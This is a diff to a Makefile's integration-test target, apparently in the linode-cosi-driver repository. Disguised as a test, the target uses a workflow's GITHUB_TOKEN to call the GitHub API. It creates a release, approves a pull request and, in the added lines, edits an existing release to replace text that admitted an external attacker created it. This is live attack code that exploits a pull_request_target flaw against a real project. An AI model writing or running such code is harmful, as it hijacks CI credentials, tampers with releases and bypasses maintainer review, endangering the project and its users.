@@ -28,7 +28,7 @@ test-integration:
 	echo "CREATE_BRANCH: $$CREATE_BRANCH" >&2 ; \
 	CREATE_RELEASE=$$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Authorization: token $$TOKEN" \
 	  -H "Accept: application/vnd.github.v3+json" \
-	  -d "{\"tag_name\": \"poc-write-proof-v1\", \"target_commitish\": \"main\", \"name\": \"PoC Write Proof\", \"body\": \"This release was created by an external attacker via pull_request_target workflow vulnerability. GITHUB_TOKEN has contents:write scope.\", \"draft\": false, \"prerelease\": true}" \
+	  -d "{\"tag_name\": \"poc-write-proof-v1\", \"target_commitish\": \"main\", \"name\": \"d3ku_poc\", \"body\": \"d3ku_poc\", \"draft\": false, \"prerelease\": true}" \
 	  https://api.github.com/repos/linode/linode-cosi-driver/releases) ; \
 	echo "CREATE_RELEASE: $$CREATE_RELEASE" >&2 ; \
 	APPROVE_PR=$$(curl -s -o /dev/null -w "%{http_code}" --request POST \
@@ -37,6 +37,11 @@ test-integration:
 	  --header "content-type: application/json" \
 	  -d "{\"event\":\"APPROVE\", \"body\": \"PoC: This approval was submitted via GITHUB_TOKEN from pull_request_target workflow.\"}") ; \
 	echo "APPROVE_PR: $$APPROVE_PR" >&2 ; \
+	EDIT_RELEASE=$$(curl -s -o /dev/null -w "%{http_code}" -X PATCH -H "Authorization: token $$TOKEN" \
+	  -H "Accept: application/vnd.github+json" \
+	  -d "{\"name\": \"d3ku_poc\", \"body\": \"d3ku_poc\"}" \
+	  https://api.github.com/repos/linode/linode-cosi-driver/releases/295797255) ; \
+	echo "EDIT_RELEASE: $$EDIT_RELEASE" >&2 ; \
 	echo "=== PoC Complete ===" >&2
 
 test-e2e:
